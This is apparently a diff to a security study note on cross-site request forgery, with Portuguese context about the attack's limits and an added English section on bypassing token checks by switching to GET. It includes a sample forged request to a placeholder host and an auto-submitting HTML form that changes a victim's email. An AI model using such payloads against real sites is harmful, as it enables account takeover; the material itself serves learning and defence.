@@ -33,3 +33,24 @@ Várias coisas têm que acontecer para que um cross-site request forgery tenha s
 </ul>
 <br/>
 Nota-se que o ataque é cego, ou seja, o invasor não pode ver o que o site-alvo envia de volta à vítima, em resposta aos pedidos forjados, a menos que ele explore um cross-site scripting ou outro bug no site do alvo. Da mesma forma, o atacante só pode ter como alvo algum link ou apresentar qualquer formulário que surge após o pedido inicial forjado, se essas relações subsequentes ou formulários são igualmente previsíveis. (Alvos múltiplos podem ser simulados, incluindo várias imagens em uma página, ou usando JavaScript para introduzir um atraso entre os cliques). Dadas essas limitações, um atacante pode ter dificuldade em encontrar registros das vítimas ou envios de formulários atacáveis. Por outro lado, as tentativas de ataque são fáceis de montar e invisíveis às vítimas, e projetistas de aplicações são menos familiarizados e preparados para ataques CSRF do que para, digamos, ataques de adivinhação de senha dicionari
+
+# Validation of CSRF token depends on request method
+Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
+
+In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:
+<i>
+GET /email/change?email=pwned@evil-user.net HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+ </i>
+ 
+ Exploit example:
+ ``` html
+  <form method="GET" action="https://vulnerablesite/email/change-email">
+     <input type="hidden" name="csrf" value="1iOsHyPVwSb0j6eFXwmd4zen1qvYrhs2">
+     <input type="email" name="email" value="atackers@email.com">
+  </form>
+  <script>
+      document.forms[0].submit();
+  </script>
+```
